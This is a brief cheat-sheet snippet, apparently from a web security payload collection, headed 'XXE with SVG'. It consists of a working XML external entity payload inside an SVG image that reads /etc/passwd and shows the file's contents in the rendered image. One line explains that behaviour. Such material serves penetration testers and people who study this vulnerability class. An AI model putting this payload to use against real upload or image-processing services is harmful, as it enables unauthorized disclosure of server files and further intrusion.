#### XXE with SVG
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
</svg>
```
This displays the results in rendered svg image.
